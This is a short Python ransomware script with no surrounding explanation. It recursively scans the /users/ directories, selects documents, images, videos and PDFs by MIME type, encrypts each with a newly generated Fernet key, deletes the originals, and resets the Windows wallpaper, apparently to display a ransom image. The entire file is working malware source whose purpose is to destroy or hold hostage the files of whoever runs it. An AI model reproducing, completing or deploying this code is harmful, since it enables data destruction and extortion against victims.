from cryptography.fernet import Fernet
import os
import threading
import magic
import base64
import ctypes

def chgbackgroun():
    path = "bg.jpg"
    img = b''

    with open(path, "wb") as f:
        data = base64.b64decode(img)
        f.write(data)

    path = os.path.abspath(path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3) 

def encrypt(file, key):
    with semaforo:
        fernet = Fernet(key)

        with open(file, "rb") as f:
                data = f.read()

        enc_data = fernet.encrypt(data)

        with open(f"{file}.enc", "wb") as f:
                f.write(enc_data)
                os.remove(file)      


def checkFile(file):
    try:
        ftype = str(fmagic.from_file(file))

        if ftype in whitelist:
            files.append(file)
    except:
        None
        
def listdir(path):
    try:
        for file in os.listdir(path):
            if os.path.isdir(f"{path}{file}"):
                dirs.append(f"{path}{file}/")
                
            else:
                checkFile(f"{path}{file}")
                 
             
    except PermissionError:
        None

global fmagic, whitelist
fmagic = magic.Magic(mime=True)
semaforo = threading.Semaphore(5)

whitelist = ["application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/msword", "image/jpeg","image/png","video/mp4","application/pdf"]
files = []
dirs = []
listdir("/users/")

if len(dirs) >= 0:
    threads = []
    for dir in dirs:
        t = threading.Thread(target=listdir, args=(dir,))
        threads.append(t)
        t.start()


    for t in threads:
        t.join()


key = Fernet.generate_key()
print(key)
for file in files:
    t = threading.Thread(target=encrypt, args=(file, key,))
    t.start()

chgbackgroun()


